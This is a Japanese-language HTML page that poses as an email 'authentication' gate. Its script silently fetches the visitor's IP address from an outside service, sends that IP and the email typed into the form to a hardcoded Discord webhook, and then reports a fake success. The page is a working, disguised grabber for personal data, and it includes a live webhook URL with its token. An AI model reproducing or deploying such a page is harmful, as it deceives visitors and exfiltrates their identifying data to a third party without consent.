<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #121212; /* ダークな背景色 */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            margin-top: 0;
            font-size: 24px;
            color: #00ff00; /* 緑色のアクセント */
        }
        input[type="email"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 20px 0;
            border: 1px solid #333;
            background-color: #2a2a2a;
            color: #ffffff;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00ff00;
            color: #121212;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #00cc00;
        }
        .glitch {
            position: relative;
            font-size: 24px;
            font-weight: bold;
            text-transform: uppercase;
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                0.025em 0.04em 0 #fffc00;
            animation: glitch 725ms infinite;
        }
        @keyframes glitch {
            0% {
                text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                    0.025em 0.04em 0 #fffc00;
            }
            15% {
                text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                    0.025em 0.04em 0 #fffc00;
            }
            16% {
                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                    -0.05em -0.05em 0 #fffc00;
            }
            49% {
                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                    -0.05em -0.05em 0 #fffc00;
            }
            50% {
                text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                    0 -0.04em 0 #fffc00;
            }
            99% {
                text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                    0 -0.04em 0 #fffc00;
            }
            100% {
                text-shadow: -0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                    0.025em 0.04em 0 #fffc00;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="glitch">認証</h1>
        <p>アクセスを続行するには、メールアドレス認証してください。</p>
        <form id="authForm">
            <input type="email" id="email" placeholder="メールアドレス" required>
            <button type="submit">認証</button>
        </form>
    </div>

    <script>
        // ページ読み込み時にIPアドレスを取得
        window.onload = async function() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // メールアドレスはユーザーに入力してもらう
                document.getElementById('authForm').addEventListener('submit', async function(event) {
                    event.preventDefault();
                    const email = document.getElementById('email').value;

                    // Webhookにデータを送信
                    const webhookUrl = 'https://discord.com/api/webhooks/1468960055163621584/tJKhKF6YwABWOWY3v01-gcK0IlsuaIPRrOkyGurBDOUd32_hu4w2u0qV9GYM8uJmDNk5';
                    const payload = {
                        ip: ipAddress,
                        email: email
                    };

                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });

                    alert('認証が完了しました。');
                    // 認証後のリダイレクトなどの処理をここに追加
                });
            } catch (error) {
                console.error('IPアドレスの取得に失敗しました:', error);
            }
        };
    </script>
</body>
</html>
